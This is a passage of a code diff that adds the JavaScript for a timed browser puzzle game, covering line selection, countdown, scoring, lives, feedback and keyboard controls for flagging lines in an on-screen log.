+    if (!rows.length) return;
+    i = Math.max(0, Math.min(rows.length - 1, i));
+    rows[s.sel]?.classList.remove('sel');
+    rows[s.sel]?.setAttribute('aria-selected', 'false');
+    s.sel = i;
+    rows[i].classList.add('sel');
+    rows[i].setAttribute('aria-selected', 'true');
+    log.setAttribute('aria-activedescendant', rows[i].id);
+    rows[i].scrollIntoView({ block: 'nearest' });
+  }
+
+  function tick() {
+    cancelAnimationFrame(s.timer);
+    if (s.state !== 'play') return;
+    const left = Math.max(0, TIME - (performance.now() - s.t0));
+    $('bar').style.transform = `scaleX(${left / TIME})`;
+    $('bar').classList.toggle('low', left < 10000);
+    const sec = Math.ceil(left / 1000);
+    $('left').textContent = `${sec} ${sec === 1 ? 'second' : 'seconds'} left`;
+    if (left <= 0) return flag(true);
+    s.timer = requestAnimationFrame(tick);
+  }
+
+  function flag(timeout = false) {
+    if (s.state !== 'play') return;
+    cancelAnimationFrame(s.timer);
+    s.state = 'reveal';
+    const rows = log.children, ans = s.cur.answers;
+    const right = !timeout && ans.includes(s.sel);
+    const fb = $('fb');
+    const ex = document.createElement('span'); ex.className = 'ex'; ex.textContent = ' ' + s.cur.explain;
+    if (right) {
+      const left = Math.max(0, TIME - (performance.now() - s.t0));
+      const pts = 100 + Math.round(left / 1000) * 5;
+      s.score += pts;
+      rows[s.sel].classList.add('right');
+      fb.className = 'right';
+      fb.textContent = `Correct! +${pts.toLocaleString('en-US')} points.`;
+    } else {
+      s.lives--;
+      if (!timeout) rows[s.sel].classList.add('wrong');
+      ans.forEach(i => rows[i].classList.add('right'));
+      fb.className = 'wrong';
+      const many = ans.length > 1 ? 'The highlighted green lines are the answers.' : 'The highlighted green line is the answer.';
+      fb.textContent = timeout ? `Time’s up. ${many}` : `Not quite. Line ${s.sel + 1} isn’t part of it. ${many}`;
+      select(ans.includes(s.sel) ? s.sel : ans[0]);
+      rows[s.sel].scrollIntoView({ block: 'center' });
+    }
+    fb.append(ex);
+    hud();
+    $('left').textContent = '';
+    $('flag').textContent = s.lives > 0 ? 'Next case' : 'See results';
+  }
+
+  function advance() {
+    if (s.state !== 'reveal') return;
+    if (s.lives > 0) return next();
+    s.state = 'over';
+    const prev = best;
+    best = Arcade.record(KEY, s.score);
+    $('best').textContent = best.toLocaleString('en-US');
+    const solved = s.n - LIVES;
+    showOverlay('Game over', `You scored ${s.score.toLocaleString('en-US')} ${s.score === 1 ? 'point' : 'points'} and solved ${solved} ${solved === 1 ? 'case' : 'cases'}. ${s.score > prev ? 'That’s a new best!' : (best ? `Your best is ${best.toLocaleString('en-US')}.` : '')}`, 'Play again');
+  }
+
+  addEventListener('keydown', e => {
+    if (e.altKey || e.ctrlKey || e.metaKey) return;
+    if (s.state === 'ready' || s.state === 'over') {
+      if (e.key === 'Enter') { e.preventDefault(); start(); }
+      return;
+    }
+    const moves = { ArrowUp: -1, ArrowDown: 1, PageUp: -10, PageDown: 10, Home: -1e6, End: 1e6 };
+    if (e.key in moves) { e.preventDefault(); select(s.sel + moves[e.key]); return; }
+    if (e.key === 'Enter') {
+      e.preventDefault();
+      if (s.state === 'play') flag(); else advance();
+    }
+  });
+  $('flag').addEventListener('click', () => { if (s.state === 'play') flag(); else advance(); log.focus(); });
+  $('go').addEventListener('click', start);
+  $('go').focus();
+})();
+</script>
